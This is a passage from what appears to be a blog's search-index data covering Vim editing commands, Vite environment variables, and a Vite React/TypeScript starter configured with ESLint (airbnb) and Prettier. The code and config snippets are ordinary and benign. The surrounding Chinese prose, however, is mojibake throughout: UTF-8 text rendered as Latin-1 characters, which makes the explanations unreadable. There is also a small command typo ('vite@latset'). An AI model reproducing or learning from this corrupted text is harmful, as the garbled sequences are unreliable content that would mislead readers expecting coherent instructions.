é¸å–å¤šå€‹å€å¡Š =G å°æ•´å€‹æª”æ¡ˆåš indent &lt;&lt; / &gt;&gt; å¾€å‰ / å¾Œ indentï¼ˆå–®è¡Œï¼‰ m + &lt;è¨˜æ†¶éµ&gt; è¨­å®šè¨˜æ†¶é»ï¼ˆè¡Œæ•¸ï¼‰ ' + &lt;è¨˜æ†¶éµ&gt; è·³å›è¨˜æ†¶é»ï¼ˆè¡Œæ•¸ï¼‰ \" + * + y æŠŠå…§å®¹è¤‡è£½åˆ°ç³»çµ±çš„å‰ªè²¼æ¿ï¼ˆé€™æ¨£æ‰èƒ½è²¼åˆ°å…¶ä»–åœ°æ–¹ï¼‰ &lt;number&gt; + gg è·³åˆ°æŒ‡å®šçš„è¡Œæ•¸ gu / gU å¿«é€Ÿåˆ‡æ›å¤§å°å¯« ~ æŠŠç›®å‰æ¸¸æ¨™ä¸Šçš„å­—è½‰æ›æˆå¤§å°å¯« çµ„åˆæŠ€ dw åˆªé™¤å–®å­— d2w åˆªé™¤å…©å€‹å–®å­— diw åˆªé™¤æ¸¸æ¨™å…§çš„å–®å­—ï¼ˆdelete inner wordï¼‰ ciw ä¿®æ”¹æ¸¸æ¨™å…§çš„å–®å­—ï¼ˆchange inner wordï¼‰ yiw è¤‡è£½æ¸¸æ¨™å…§çš„å–®å­—ï¼ˆyank inner wordï¼‰ ci( æ”¹è®Š ( å…§çš„æ–‡å­—ï¼ˆğŸ‘ï¼‰ yi( è¤‡è£½ ( å…§çš„æ–‡å­—ï¼ˆğŸ‘ï¼‰ di( åˆªé™¤ ( å…§çš„æ–‡å­—ï¼ˆğŸ‘ï¼‰ (è¡Œæ•¸) + G è·³åˆ°æŒ‡å®šçš„è¡Œæ•¸ï¼ˆæˆ–æ˜¯ç›´æ¥ä¸‹æŒ‡ä»¤ :è¡Œæ•¸ï¼‰ :norm $a, å°é¸å–çš„å€å¡ŠåŸ·è¡Œé€™å€‹å‹•ä½œï¼ˆåœ¨æœ€å¾Œé¢ appren ä¸€å€‹é€—è™Ÿï¼‰ :! sort æŠŠé¸å–çš„æ–‡å­—åšæ’åºï¼ˆunix onlyï¼‰ gf å°ç›®å‰æª”æ¡ˆè£¡çš„è·¯å¾‘ï¼ˆå­—ä¸²ï¼‰åŸ·è¡Œå¾Œå°±èƒ½æ‰“é–‹é‚£å€‹æª”æ¡ˆ *cgn. æ›¿æ›æ‰å¤šçµ„ç›¸åŒçš„å–®å­—ï¼ˆè©³ç´°å¯ä»¥åƒè€ƒé€™ç¯‡ï¼‰ f&lt;letter&gt;; ç•¶ä½ ç”¨ f + &lt;letter&gt; æ‰¾åˆ°ç¬¬ä¸€å€‹å­—ä¸æ˜¯ä½ æƒ³è¦çš„é‚£ä¸€å€‹ï¼Œå¯ä»¥æŒ‰ ; ä¾†é‡è¤‡é€™å€‹å‹•ä½œ æœå°‹è¦åœ¨ vim è£¡é¢æœå°‹æ–‡å­—çš„è©±å¯ä»¥åœ¨æ™®é€šæ¨¡å¼ä¸­ä¸‹ã€Œ/ + é—œéµå­—ã€ï¼Œå°±å¯ä»¥æ ¹æ“šé—œéµå­—ä¾†æœå°‹æ‰€æœ‰ç¬¦åˆçš„æ–‡å­—ã€‚ å¦‚æœè¦å¾€ä¸‹å°‹æ‰¾å¯ä»¥æŒ‰ä¸‹ nï¼Œå¾€å‰å°‹æ‰¾å¯ä»¥æŒ‰ä¸‹ Nã€‚ æˆ–è€…æ˜¯æˆ‘æƒ³æœå°‹ç›®å‰æ¸¸æ¨™é™„è¿‘çš„å–®å­—ï¼Œå¯ä»¥åœ¨é‚£å€‹å–®å­—æ—é‚Šç”¨ * æˆ– # ä¾†è‡ªå‹•æœå°‹é€™å€‹å–®å­—ï¼š é™„è¨»ï¼š* æ˜¯å¾€ä¸‹æ‰¾ï¼Œ# æ˜¯å¾€ä¸Šæ‰¾ã€‚ æœå°‹å¥½äº†ï¼Œå¯ä»¥ä¸è¦å† highlight äº†å—ï¼Ÿæœ‰äº›ä¸»é¡Œå¯èƒ½æœƒè‡ªå‹•æŠŠ match çš„æ–‡å­—çµ¦ highlight èµ·ä¾†ï¼Œé€™å€‹æ˜¯å¥½åŠŸèƒ½æ˜¯æ²’éŒ¯ï¼Œä½†å‰ææ˜¯ä¸è¦åœ¨æˆ‘å·²ç¶“ç¶“å–æ¶ˆæœå°‹äº†é‚„æŒçºŒ highlightã€‚ ç¸½ä¹‹ç¢°åˆ°é€™ç¨®å•é¡Œçš„æ™‚å€™ä½ å¯ä»¥é‡æ–°ç”¨ / æœå°‹ä¸€ä¸²ç„¡æ„ç¾©æ–‡å­—å°±èƒ½å–æ¶ˆäº†ã€‚ è·³èºåˆ°ä¸Šå€‹è¨˜æ†¶é»é€™æ‹›æˆ‘è¦ºå¾—å¾ˆå€¼å¾—å­¸æ‰€ä»¥ç‰¹åˆ¥åˆ—ä¸€ä¸‹ï¼Œç°¡å–®ä¾†èªªå°±æ˜¯ä½ å¯ä»¥ç”¨ m + &lt;è¨˜æ†¶é»&gt; ä¾†æŠŠé€™å€‹è¡Œæ•¸çµ¦è¨˜èµ·ä¾†ï¼Œæ¥è‘—ç•¶ä½ æƒ³è·³å›è¨˜æ†¶é»çš„æ™‚å€™åªè¦ç”¨ ' + &lt;è¨˜æ†¶é»&gt; å°±å¯ä»¥é¦¬ä¸Šè·³å›é‚£ç•¶åˆçš„è¡Œæ•¸ã€‚ ç›´æ¥ä¾†çœ‹ç¤ºç¯„ï¼š å…ˆåŸè«’æˆ‘é€™æ™‚å€™é‚„ä¸æœƒè¨­å®š highlightï¼Œæ‰€ä»¥çœ‹èµ·ä¾†å¾ˆå‚·çœ¼ QQï¼Œä¸éé€™é‚Šçš„é‡é»æ˜¯æˆ‘å…ˆåœ¨ onSave å’Œ onAddFile å„åˆ¥è¨­å®šäº†è¨˜æ†¶é»ï¼Œæ¥è‘—ç•¶æˆ‘è·³åˆ°å…¶ä»–åœ°æ–¹è¦å†è·³å›å»æ™‚ï¼Œæˆ‘åªè¦ä¸‹ï¼š 1' + &lt;è¨˜æ†¶é»&gt; å°±å¯ä»¥é¦¬ä¸Šè·³å›æˆ‘ç•¶åˆè¨˜æ†¶çš„åœ°æ–¹ï¼Œé€™å€‹åŠŸèƒ½çœŸçš„è¶…æ–¹ä¾¿çš„å•¦~ å–ä»£æª”æ¡ˆä¸­çš„æ‰€æœ‰æ–‡å­—ç°¡å–®ä¾†èªªå°±æ˜¯å°æª”æ¡ˆä¸­çš„å­—ä¸²åšå…¨åŸŸä¿®æ”¹ï¼Œç”¨æ³•æ˜¯ï¼š 1:%s/&lt;èˆŠå­—ä¸²&gt;/&lt;æ–°å­—ä¸²&gt;/g æˆ–è€…æˆ‘ä¹Ÿå¯ä»¥åªé¸æ“‡ä¸€å€‹å€å¡Šä¾†åšä¿®æ”¹ï¼š 1:s/&lt;èˆŠå­—ä¸²&gt;/&lt;æ–°å­—ä¸²&gt;/g é †é“ä¸€æï¼Œå¦‚æœä¸åŠ ä¸Š g çš„è©±åªæœƒæŠŠæ¯ä¸€è¡Œç¬¬ä¸€å€‹ç¬¦åˆçš„å­—çµ¦æ›¿æ›æ‰ï¼Œåƒé€™æ¨£ï¼š å¦‚æœè¦æ›¿æ›çš„å­—å‰›å¥½æ˜¯ / çš„è©±ï¼Œå¯ä»¥æ”¹ç”¨å…¶ä»–çš„åˆ†éš”ç¬¦ï¼ˆdelimiterï¼‰ä¾†å–ä»£ï¼Œæ¯”è¼ƒå¸¸è¦‹çš„æœƒæ˜¯ #ï¼š","link":"/2022/10/16/vim-note/"},{"title":"Viteï¼Environment Variable","text":"å¥½ç”¨çš„ç’°å¢ƒè®Šæ•¸ã€‚ é è¨­çš„ç’°å¢ƒè®Šæ•¸ import.meta.env.MODE ç›®å‰çš„ç’°å¢ƒï¼ˆdevelopment / productionï¼‰ import.meta.env.BASE_URL å°±æ˜¯ base url import.meta.env.PROD ç¢ºèªç’°å¢ƒæ˜¯ä¸æ˜¯ productionï¼ˆå¸ƒæ—å€¼ï¼‰ import.meta.env.DEV ç¢ºèªç’°å¢ƒæ˜¯ä¸æ˜¯ developmentï¼ˆå¸ƒæ—å€¼ï¼‰ import.meta.env.SSR æœ‰æ²’æœ‰ä½¿ç”¨ SSR æ·»åŠ  .env æª”æ¡ˆ .env .env.[mode] .env.local .env.[mode].local é™„è¨»ä¸€ï¼š[mode] çš„å€¼ç‚º development å’Œ productioné™„è¨»äºŒï¼š.local ä¸€èˆ¬æœƒç”¨ä¾†å­˜æ•æ„Ÿè³‡è¨Šï¼Œæ‰€ä»¥ä¸æœƒè¢«å¯«å…¥ git å„ªå…ˆæ¬Šç‚ºï¼š.env.[mode].local &gt; .env.[mode] &gt; .env.local &gt; .env ä¸€å®šè¦ç”¨ VITE å‰ç¶´å­—æ‰å¯ä»¥å­˜å–åˆ°ï¼Œä¾‹å¦‚èªªç¾åœ¨æœ‰åº•ä¸‹é€™äº›ç’°å¢ƒè®Šæ•¸ï¼š 12VITE_SOME_KEY=123DB_PASSWORD=foobar é‚£åœ¨å­˜å–çš„æ™‚å€™åªèƒ½è®€åˆ° VITE_SOME_KEYï¼Œè®€ä¸åˆ° DB_PASSWORDï¼š 12console.log(import.meta.env.VITE_SOME_KEY) // 123console.log(import.meta.env.DB_PASSWORD) // undefined è‡ªå®šç¾© .env æª”æ¡ˆå¦‚æœé è¨­æä¾›çš„ .env.[mode] ä¸èƒ½æ»¿è¶³ä½ è¦çš„ç’°å¢ƒï¼Œä¾‹å¦‚èªªä½ æƒ³è¦ç”¨ä¸€å€‹ .env.demo çš„æª”æ¡ˆä¾†å­˜è®Šæ•¸ï¼Œæ‰€ä»¥å¯«äº†é€™æ¨£çš„æª”æ¡ˆï¼š 12// .env.demoVITE_ENV_KEY=env.demo é‚£éº½å¯ä»¥æŠŠ build çš„æŒ‡ä»¤æ”¹æˆé€™æ¨£å­ï¼š 123456\"scripts\": { \"dev\": \"vite\", \"build\": \"tsc &amp;&amp; vite build\", \"demo\": \"tsc &amp;&amp; vite build --mode demo\", // &lt;- new \"preview\": \"vite preview\"} é€™æ¨£å­ vite åœ¨æ‰“åŒ…çš„æ™‚å°±æœƒæ›´æ–° mode çš„å€¼ï¼Œä¸¦è®€å– .env.demo é€™å€‹æª”æ¡ˆçš„å…§å®¹ã€‚","link":"/2022/12/02/vite-environment-variable/"},{"title":"ç”¨ Vite æ‰“é€ ä¸€å€‹ Start Project","text":"ä¹Ÿè¨±è©²æ›´æ—©é–‹å§‹ç”¨é€™æ±è¥¿ã€‚ ç°¡è¿°åœ¨å¯¦éš›æ¥æ‰‹éå¹¾é …å°ˆæ¡ˆä»¥å¾Œï¼Œæˆ‘å¸¸å¸¸æœƒçœ‹åˆ°ä¸€äº›ç¨‹å¼ç¢¼é¢¨æ ¼èˆ‡ç¨‹å¼ç¢¼å“è³ªçš„å•é¡Œï¼Œä¾‹å¦‚èªªï¼š åˆ°åº•è©²ç”¨å–®å¼•è™Ÿé‚„æ˜¯é›™å¼•è™Ÿï¼Ÿ åˆ°åº•ç¸®æ’è¦ç©º 2 æ ¼é‚„æ˜¯ 4 æ ¼ï¼Ÿè¦ç”¨ Tab é‚„æ˜¯ç©ºæ ¼ï¼Ÿ è©²ç”¨ç®­é ­å‡½å¼é‚„æ˜¯æ™®é€šå‡½å¼ï¼Ÿ ä¸æœƒè¢«æ”¹è®Šçš„è®Šæ•¸æ˜¯ä¸æ˜¯è©²ä¸€å¾‹ç”¨ const ä¾†å®£å‘Šï¼Ÿ æ²’ç”¨åˆ°çš„è®Šæ•¸ï¼Œæˆ–è€…æ˜¯éå¿…è¦çš„ console æ˜¯ä¸æ˜¯ä¸è©²å‡ºç¾ï¼Ÿ etcâ€¦ é›–ç„¶é€™å¹¾å€‹å•é¡Œå¯ä»¥èªªæ˜¯è·Ÿå€‹äººå–œå¥½æœ‰é—œï¼Œä½†æˆ‘è¦ºå¾—åœ¨åœ˜éšŠåˆä½œä¸Šæ‡‰è©²é‚„æ˜¯è¦æœ‰ä¸€å€‹æ˜ç¢ºçš„è¦ç¯„æ¯”è¼ƒå¥½ï¼Œä¸€ä¾†æ˜¯è®“æ•´å€‹å°ˆæ¡ˆæœ‰ä¸€è‡´æ€§ï¼ŒäºŒä¾†æ˜¯èƒ½è®“ä¸‹ä¸€å€‹æ¥æ‰‹çš„äººå¯ä»¥æœ‰æ›´å¥½çš„é–‹ç™¼é«”é©—ï¼ˆï¼Ÿï¼Ÿï¼Ÿ ç¸½ä¹‹å‘¢ï¼Œé€™ç¯‡æƒ³è¦å¾é ­é–‹å§‹ç”¨ Vite ä¾†å»ºç«‹ä¸€å€‹ Start Projectï¼Œè¦æ•´åˆçš„é …ç›®æœ‰ï¼š React TypeScript ESlintï¼ˆairbnbï¼‰ Prettier Enviroment Variable æ­¥é©Ÿ1. å»ºç«‹ vite å°ˆæ¡ˆï¼ˆReact + TypeScriptï¼‰1npm create vite@latset 2. åˆå§‹åŒ– ESLinté€™é‚Šæœƒé€é global eslint çš„æŒ‡ä»¤ä¾†åˆå§‹åŒ–ï¼Œå¦‚æœä½ æ²’æœ‰çš„è©±è¨˜å¾—å…ˆ npm install -g eslintï¼š 1eslint --init æ¥ä¸‹ä¾†ä¾åºé¸æ“‡ï¼š To check syntax and find problems JavaScript modules (import/export) React (framework) Yes (TypeScript) Browser JSON Yes (install all needed dependencies) npm æ ¹æ“šå‰›å‰›çš„é¸æ“‡ï¼Œæ¥ä¸‹ä¾†æ‡‰è©²æœƒå¹«ä½ å®‰è£åº•ä¸‹é€™å¹¾å€‹å¥—ä»¶ï¼š eslint-plugin-react @typescript-eslint/eslint-plugin @typescript-eslint/parser eslint å¯ä»¥åˆ° package.json ä¸­ç¢ºèªï¼š 1234567891011\"devDependencies\": { \"@types/react\": \"^18.0.24\", \"@types/react-dom\": \"^18.0.8\", \"@typescript-eslint/eslint-plugin\": \"^5.45.0\", // &lt;- new \"@typescript-eslint/parser\": \"^5.45.0\", // &lt;- new \"@vitejs/plugin-react\": \"^2.2.0\", // &lt;- new \"eslint\": \"^8.28.0\", // &lt;- new \"eslint-plugin-react\": \"^7.31.11\", // &lt;- new \"typescript\": \"^4.6.4\", \"vite\": \"^3.2.3\"} åˆ°ç›®å‰ç‚ºæ­¢ï¼Œæ‰“é–‹ .eslintrc.json çš„å…§å®¹æ‡‰è©²æœƒæ˜¯å¤§æ¦‚åƒé€™æ¨£å­ï¼š 12345678910111213141516171819{ \"env\": { \"browser\": true, \"es2021\": true }, \"extends\": [ \"eslint:recommended\", // &lt;- é€™æ˜¯é è¨­çš„ configï¼Œç­‰ä¸€æœƒå…’è¦æ›æˆ airbnb \"plugin:react/recommended\", \"plugin:@typescript-eslint/recommended\" ], \"overrides\": [], \"parser\": \"@typescript-eslint/parser\", \"parserOptions\": { \"ecmaVersion\": \"latest\", \"sourceType\": \"module\" }, \"plugins\": [\"react\", \"@typescript-eslint\"], \"rules\": {}} å¦‚æœä½ ä¸çŸ¥é“é€™é‚Šçš„å…§å®¹æ˜¯åœ¨è¨­å®šä»€éº¼çš„è©±ï¼Ÿå¯ä»¥åˆ° ESlint - é…ç½®ä¸€å€‹ Airbnb ç’°å¢ƒ åƒè€ƒï¼Œæ¥ä¸‹ä¾†æˆ‘å€‘è¦æ·»åŠ  airbnb çš„ configã€‚ 3. æ·»åŠ  airbnb çš„è¦å‰‡é¦–å…ˆè¦å®‰è£ eslint-config-airbnbï¼Œæˆ‘éƒ½æŠŠå®ƒç¨±ç‚º airbnb çµ„åˆåŒ…ï¼Œå…§å®¹ç‰©åŒ…å«å¤šå€‹ plugin å’Œä¸€å€‹ configï¼š eslint-config-airbnbï¼šæ ¹æ“šåº•ä¸‹çš„ plugin ä¾†æ’°å¯«çš„ rules eslint-plugin-importï¼šæ·»åŠ  import ç›¸é—œçš„è¦å‰‡ eslint-plugin-jsx-a11yï¼šæ·»åŠ  a11y ç›¸é—œçš„è¦å‰‡ eslint-plugin-reactï¼šæ·»åŠ  react ç›¸é—œçš„è¦å‰‡ eslint-plugin-react-hooksï¼šæ·»åŠ  react hook ç›¸é—œçš„è¦å‰‡ é™„è¨»ï¼šå†æé†’ä¸€æ¬¡ï¼Œå¦‚æœä½ ä¸çŸ¥é“ config è·Ÿ plugin çš„å·®åˆ¥ï¼Œè«‹åƒè€ƒ ESlint - é…ç½®ä¸€å€‹ Airbnb ç’°å¢ƒ è£å¥½å¾ŒæŠŠ .eslintrc.json çš„å…§å®¹ä¿®æ”¹æˆä»¥ä¸‹ï¼š 1234567891011121314151617181920{ \"env\": { \"browser\": true, \"es2021\": true }, \"extends\": [ \"airbnb\", // &lt;- update \"airbnb/hooks\", // &lt;- update \"plugin:react/recommended\", \"plugin:@typescript-eslint/recommended\" ], \"overrides\": [], \"parser\": \"@typescript-eslint/parser\", \"parserOptions\": { \"ecmaVersion\": \"latest\", \"sourceType\": \"module\" }, \"plugins\": [\"react\", \"@typescript-eslint\"], \"rules\": {}} åšåˆ°é€™é‚Šå¾Œï¼Œä½ å¯ä»¥æ‰“é–‹ App.tsxï¼Œç„¶å¾ŒåŠ ä¸Š useEffect ä¾†ç¢ºèªæ˜¯å¦æœ‰è®€å–åˆ°å°æ‡‰çš„è¦å‰‡ï¼š åˆ°ç›®å‰ç‚ºæ­¢ï¼Œairbnb çš„åŸºæœ¬é…ç½®å·²ç¶“è¨­å®šå¥½äº†ï¼Œæ¥ä¸‹ä¾†æœƒå…ˆä¿®å¾©å¹¾å€‹ä½ å¯èƒ½æœƒç¢°åˆ°çš„å•é¡Œã€‚ 4. ä¿®å¾© import çš„éŒ¯èª¤æ‰“é–‹ main.tsx å¾Œæœƒçœ‹åˆ°æœ‰ä¸€å€‹éŒ¯èª¤æ˜¯ä¸æ­£ç¢ºçš„ï¼Œåƒé€™å€‹ï¼š ç…§ç†èªªæˆ‘å€‘é€™æ¨£çš„å¼•å…¥æ–¹å¼æ‡‰è©²æ˜¯æ²’æœ‰éŒ¯çš„ï¼Œä½†æ˜¯å»æœƒé¡¯ç¤ºå‰¯æª”åå’Œæ‰¾ä¸åˆ°æ¨¡çµ„çš„éŒ¯èª¤è¨Šæ¯ã€‚åŸå› çš„è©±æˆ‘çŒœæ˜¯å› ç‚ºé€™è£¡ç”¨çš„æ˜¯ TypeScriptï¼Œæ‰€ä»¥åœ¨è§£æ .tsx æª”æ¡ˆæ™‚æœƒæœ‰ä¸€äº›ç›¸å®¹æ€§çš„å•é¡Œã€‚ è§£æ³•æ–¹æ³•æ˜¯å®‰è£ eslint-config-airbnb-typescript ä¸¦æŠŠ .eslintrc.json çš„å…§å®¹ä¿®æ”¹ç‚ºåº•ä¸‹é€™æ¨£ï¼š 12345678910111213141516171819202122{ \"env\": { \"browser\": true, \"es2021\": true }, \"extends\": [ \"airbnb\", \"airbnb/hooks\", \"airbnb-typescript\", // &lt;- åŠ ä¸Šæ–°çš„ config \"plugin:react/recommended\", \"plugin:@typescript-eslint/recommended\" ], \"overrides\": [], \"parser\": \"@typescript-eslint/parser\", \"parserOptions\": { \"ecmaVersion\": \"latest\", \"sourceType\": \"module\", \"project\": \"tsconfig.json\" // &lt;- å¡«å…¥ tsconfig.json çš„ä½ç½®ï¼ˆæœ‰æ²’æœ‰ ./ éƒ½å¯ä»¥ï¼‰ }, \"plugins\": [\"react\", \"@typescript-eslint\"], \"rules\": {}} ç°¡å–®ä¾†èªªé€™é‚Šåšçš„äº‹æƒ…æ˜¯è®“ ESLint å»é€é tsconfig.json ä¾†è§£æ .tsx ç›¸é—œçš„æª”æ¡ˆï¼Œæ‰€ä»¥è¨­å®šå¥½å¾Œæ‡‰è©²å°±èƒ½çœ‹åˆ°å•é¡Œè§£æ±ºäº†ï¼š é™„è¨»ï¼šæ²’æœ‰å‰›å‰›çš„ import å•é¡Œäº† 5. ä¿®å¾© vite.config.ts çš„éŒ¯èª¤ä¿®æ­£å®Œå‰›å‰›çš„éŒ¯èª¤å¾Œæ‰“é–‹ vite.config.ts æœƒç™¼ç¾å¦å¤–ä¸€é …éŒ¯èª¤ï¼š ç°¡å–®ä¾†èªªï¼Œé€™é‚Šçš„æ„æ€æ˜¯æˆ‘å€‘å‰›å‰›é€é parserOptions è®“ ESLint ç”¨ tsconfig.json ä¾†è§£ææª”æ¡ˆï¼Œä½† ESlint ç™¼ç¾ vite.config.ts ä¸¦æ²’æœ‰è¢«åŒ…å«åœ¨å…¶ä¸­ï¼š 12345678910111213141516171819202122// tsconfig.json{ \"compilerOptions\": { \"target\": \"ESNext\", \"useDefineForClassFields\": true, \"lib\": [\"DOM\", \"DOM.Iterable\", \"ESNext\"], \"allowJs\": false, \"skipLibCheck\": true, \"esModuleInterop\": false, \"allowSyntheticDefaultImports\": true, \"strict\": true, \"forceConsistentCasingInFileNames\": true, \"module\": \"ESNext\", \"moduleResolution\": \"Node\", \"resolveJsonModule\": true, \"isolatedModules\": true, \"noEmit\": true, \"jsx\": \"react-jsx\" }, \"include\": [\"src\"], // &lt;- åªåŒ…å« src åº•ä¸‹çš„æª”æ¡ˆ \"references\": [{ \"path\": \"./tsconfig.node.json\" }]} è§£æ±ºçš„æ–¹å¼å°±æ˜¯æŠŠ vite.config.ts å¡«é€²å»å°±å¯ä»¥äº†ï¼š 123456789101112131415161718192021{ \"compilerOptions\": { \"target\": \"ESNext\", \"useDefineForClassFields\": true, \"lib\": [\"DOM\", \"DOM.Iterable\", \"ESNext\"], \"allowJs\": false, \"skipLibCheck\": true, \"esModuleInterop\": false, \"allowSyntheticDefaultImports\": true, \"strict\": true, \"forceConsistentCasingInFileNames\": true, \"module\": \"ESNext\", \"moduleResolution\": \"Node\", \"resolveJsonModule\": true, \"isolatedModules\": true, \"noEmit\": true, \"jsx\": \"react-jsx\" }, \"include\": [\"vite.config.ts\", \"src\"], // &lt;- æŠŠ vite åŠ é€²å» \"references\": [{ \"path\": \"./tsconfig.node.json\" }]} é›–ç„¶è®Šæˆäº†å¦ä¸€é …éŒ¯èª¤ï¼ˆiport/no-extraneous-dependenciesï¼‰ï¼Œä½†å¯ä»¥çœ‹åˆ°å‰›å‰›çš„éŒ¯èª¤ç¢ºå¯¦æ¶ˆå¤±äº†ï¼Œ è‡³æ–¼é€™å€‹æ–°çš„å•é¡Œæ˜¯åœ¨æé†’æˆ‘å€‘æ˜¯ä¸æ˜¯è£äº†æ²’ç”¨çš„ dependenciesï¼Œä¸éä»¥ç›®å‰çš„ case ä¾†èªªå…¶å¯¦æ˜¯æœ‰ç”¨çš„ï¼Œå»ºè­°åˆ° .eslintrc.json å°é€™é … rules èª¿æ•´ä¸€ä¸‹å°±å¥½ï¼š 1234567891011121314151617181920212223242526{ \"env\": { \"browser\": true, \"es2021\": true }, \"extends\": [ \"airbnb\", \"airbnb/hooks\", \"airbnb-typescript\", \"plugin:react/recommended\", \"plugin:@typescript-eslint/recommended\", \"plugin:prettier/recommended\" ], \"overrides\": [], \"parser\": \"@typescript-eslint/parser\", \"parserOptions\": { \"ecmaVersion\": \"latest\", \"sourceType\": \"module\", \"project\": \"tsconfig.json\" }, \"plugins\": [\"react\", \"@typescript-eslint\"], \"rules\": { // åŠ ä¸Šé€™è¡Œ \"import/no-extraneous-dependencies\": [\"error\", { \"devDependencies\": true }] }} 6. åŠ å…¥ prettieréœ€è¦å®‰è£çš„å¥—ä»¶ï¼š prettierï¼šcore package eslint-plugin-prettierï¼šæ·»åŠ  prettier ç›¸é—œçš„è¦å‰‡ eslint-config-prettierï¼šè¨­å®š prettier plugin çš„ config æ¥ä¸‹ä¾†è¦è™•ç† prettier å’Œ ESLint ç›¸è¡çš„å•é¡Œï¼Œæ‰€ä»¥ä¸€æ¨£æŠŠ .eslintrc.json ä¿®æ”¹æˆåº•ä¸‹ï¼š 1234567891011121314151617181920212223{ \"env\": { \"browser\": true, \"es2021\": true }, \"extends\": [ \"airbnb\", \"airbnb/hooks\", \"airbnb-typescript\", \"plugin:react/recommended\", \"plugin:@typescript-eslint/recommended\", \"plugin:prettier/recommended\" // &lt;- è«‹å‹™å¿…æ”¾åœ¨æœ€å¾Œä¸€å€‹ï¼Œé€™å€‹é †åºæ˜¯æœ‰æ„ç¾©çš„ ], \"overrides\": [], \"parser\": \"@typescript-eslint/parser\", \"parserOptions\": { \"ecmaVersion\": \"latest\", \"sourceType\": \"module\", \"project\": \"tsconfig.json\" }, \"plugins\": [\"react\", \"@typescript-eslint\"], \"rules\": {}} é™„è¨»ï¼šé€™é‚Šçš„å¯«æ³•æ˜¯å®˜æ–¹æ¨è–¦çš„ç°¡åŒ–å¯«æ³•ï¼Œå…¶å¯¦åŸæœ¬çš„å¯«æ³•æ˜¯é€™æ¨£ã€‚ å†å¼·èª¿ä¸€æ¬¡ä¸€å®šè¦æŠŠ prettier æ”¾åœ¨æœ€å¾Œé¢ï¼Œé€™æ¨£å­ ESLint æ‰æœƒå„ªå…ˆç”¨ prettier çš„è¦å‰‡ä¾†è¦†å¯«æ‰å…¶ä»–å‰é¢çš„è¦å‰‡ï¼Œæ‰€ä»¥ä½ æ‡‰è©²æœƒçœ‹åˆ°é€™æ¨£çš„éŒ¯èª¤è¨Šæ¯ï¼š æ³¨æ„ç¾åœ¨é€™äº›è¦å‰‡éƒ½æ˜¯ä¾†è‡ª prettierï¼Œè€Œä¸æ˜¯å‰é¢çš„è¦å‰‡ã€‚æ„æ€æ˜¯æŒ‡ prettier æ“æœ‰æœ€å¤§çš„å„ªå…ˆæ¬Šï¼Œæ‰€ä»¥ä¸ç®¡å‰é¢çš„è¦å‰‡å¦‚ä½•æœ€å¾Œéƒ½å¾—è½ prettier çš„ï¼Œé€™æ¨£å­ç­‰ä¸€ä¸‹åœ¨æ ¼å¼åŒ–çš„æ™‚å€™å°±ä¸æœƒå‡ºç¾è¡çªçš„å•é¡Œã€‚ åˆ°ç›®å‰ç‚ºæ­¢å·²ç¶“å®Œæˆ prettier å’Œ ESLint çš„é…ç½®ï¼Œæ¥ä¸‹ä¾†è¦æ·»åŠ  prettier config æª”æ¡ˆã€‚ 7. è¨­å®š prettier configæ¥ä¸‹ä¾†é€™é‚Šå°±æ˜¯åœ˜éšŠè¨è«–çš„æ™‚é–“äº†ï¼Œé€™é‚Šæœƒé€é .prettierrc ä¾†å¼·åˆ¶è®“æ‰€æœ‰äººçš„ prettier ç”¨ç›¸åŒçš„æ¢ä»¶å»åšæ ¼å¼åŒ–ï¼Œé€™é‚Šé™„ä¸Šæˆ‘å€‹äººæ¯”è¼ƒåå¥½çš„è¨­å®šï¼š 123456789{ \"semi\": false, \"singleQuote\": true, \"jsxSingleQuote\": true, \"trailingComma\": \"none\", \"useTabs\": false, \"tabWidth\": 2, \"printWidth\": 100} é™„è¨»ï¼šé€™äº›è¦å‰‡ç­‰åŒæ–¼ ESLint ä¸Šçš„è¦å‰‡ï¼Œæ‰€ä»¥æ²’æœ‰éµå¾ªçš„è©±ä¹Ÿæœƒå‡ºç¾æç¤ºè¨Šæ¯ã€‚ å®Œæˆå¾ŒåŸ·è¡Œ formatOnSaveï¼ˆVS-Code çš„è¨­å®šï¼‰ä»¥å¾Œå°±æœƒçœ‹åˆ°æ‰€æœ‰ prettier ç›¸é—œçš„è¨Šæ¯éƒ½æ¶ˆå¤±å›‰ï¼š 8. èª¿æ•´éƒ¨åˆ† rulesè¨­å®šå®Œ prettier ä»¥å¾Œï¼Œç¢ºå¯¦è§£æ±ºäº†å’Œ ESLint ç›¸è¡çš„å•é¡Œï¼Œä¸éé‚„æ˜¯æœƒçœ‹åˆ°ä¸€äº›å…¶ä»–çš„éŒ¯èª¤è¨Šæ¯ï¼š é€™é‚Šçš„éŒ¯èª¤æœ‰ä¸‰å€‹ï¼š react/react-in-jsx-scopeï¼šæ²’æœ‰å®£å‘Š Reactï¼ˆèˆŠç‰ˆçš„ React éœ€è¦ï¼‰ react/jsx-no-target-blankï¼šç•¶ target='_blank' æ™‚éœ€åŠ ä¸Š rel=\"noreferrer\" ä¾†é¿å…å®‰å…¨æ€§å•é¡Œ @typescript-eslint/no-shadowï¼šå‡ºç¾åŒåç¨±çš„è®Šæ•¸ï¼ˆé›–ç„¶ä¸åŒ scope ä¹‹é–“äº’ä¸å½±éŸ¿ï¼Œä½†æœƒå½±éŸ¿åˆ°å¯è®€æ€§ï¼‰ ä»¥é€™ä¸‰å€‹å•é¡Œä¾†èªªï¼Œæˆ‘è‡ªå·±èªç‚ºç¬¬ä¸€ã€ä¸‰é …æ˜¯éå¿…è¦çš„è¦å‰‡ï¼Œæ‰€ä»¥å¯ä»¥åˆ° .eslintrc.json æŠŠ rules çš„éƒ¨åˆ†ä¿®æ”¹æˆåº•ä¸‹ï¼š 123456789101112131415161718192021222324252627{ \"env\": { \"browser\": true, \"es2021\": true }, \"extends\": [ \"airbnb\", \"airbnb/hooks\", \"airbnb-typescript\", \"plugin:react/recommended\", \"plugin:@typescript-eslint/recommended\", \"plugin:prettier/recommended\" ], \"overrides\": [], \"parser\": \"@typescript-eslint/parser\", \"parserOptions\": { \"ecmaVersion\": \"latest\", \"sourceType\": \"module\", \"project\": \"tsconfig.json\" }, \"plugins\": [\"react\", \"@typescript-eslint\"], // æ–°å¢å…©å€‹è‡ªè¨‚çš„è¡Œç‚º \"rules\": { \"react/react-in-jsx-scope\": \"off\", \"@typescript-eslint/no-shadow\": \"off\" }} é™„è¨»ï¼šå¯ä»¥èª¿æ•´çš„åƒæ•¸æœ‰ offã€warnã€errorã€‚ ä¿®æ”¹å®Œå¾Œå°±æœƒçœ‹åˆ°åªç•™ä¸‹å…¶ä»–æ²’æœ‰è¢« off çš„è¨Šæ¯ï¼š ç‰¹åˆ¥å¯«é€™æ®µåªæ˜¯æƒ³è®“ä½ 